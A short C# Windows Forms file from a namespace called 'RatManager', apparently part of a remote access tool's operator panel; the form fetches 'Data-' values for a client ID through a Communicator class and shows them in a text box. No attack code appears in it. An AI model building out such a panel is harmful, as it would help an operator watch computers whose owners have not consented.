using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatManager.SubPages
{
    public partial class PCData : Form
    {
        private string clientId;
        private Communicator communicator;
        public PCData(string clientId)
        {
            InitializeComponent();
            this.communicator = new Communicator();
            this.clientId = clientId;
            var data = communicator.GetValues(clientId, "Data-");
            richTextBox1.Text = String.Join(Environment.NewLine, data);
        }
    }
}
